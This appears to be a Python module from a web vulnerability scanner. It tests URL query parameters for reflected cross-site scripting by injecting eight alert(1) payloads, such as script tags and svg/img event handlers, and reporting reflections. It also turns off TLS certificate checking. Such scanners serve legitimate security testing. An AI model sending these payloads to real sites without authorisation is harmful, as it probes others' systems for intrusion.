import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from modules.colors import Colors

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "User-Agent": "Mozilla/5.0"
}

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    query[param] = payload

    new_query = urlencode(query, doseq=True)

    new_url = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

    return new_url


def detect_xss(url, report):

    print(f"\n{Colors.BLUE}[+] Testing for XSS vulnerabilities...{Colors.RESET}\n")

    report.write("XSS Vulnerability Test\n")
    report.write("----------------------\n")

    # 🔥 Expanded payloads (realistic + bypass tricks)
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>"
    ]

    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # If no params → create default
        if not params:
            params = {"q": ["test"]}

        for param in params:

            print(f"{Colors.CYAN}[INFO]{Colors.RESET} Testing parameter: {param}")

            for payload in payloads:

                # 🔁 Normal payload
                test_url = inject_payload(url, param, payload)

                print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} {test_url}")

                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                content = response.text.lower()

                # 🔴 1. Direct reflection
                if payload.lower() in content:
                    print(f"{Colors.RED}[HIGH]{Colors.RESET} Reflected XSS detected")
                    print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")

                    report.write("HIGH: Reflected XSS detected\n")
                    report.write(f"Parameter: {param}\n")
                    report.write(f"Payload: {payload}\n\n")
                    return

                # 🟡 2. Encoded reflection check
                encoded_payload = quote(payload)
                if encoded_payload.lower() in content:
                    print(f"{Colors.YELLOW}[MEDIUM]{Colors.RESET} Possible XSS (encoded reflection)")
                    print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")

                    report.write("MEDIUM: Possible XSS (encoded reflection)\n")
                    report.write(f"Parameter: {param}\n")
                    report.write(f"Payload: {payload}\n\n")
                    return

        print(f"{Colors.GREEN}[INFO]{Colors.RESET} No reflected XSS detected")
        report.write("INFO: No reflected XSS detected\n\n")

    except requests.exceptions.RequestException as e:
        print("XSS test error:", e)

           
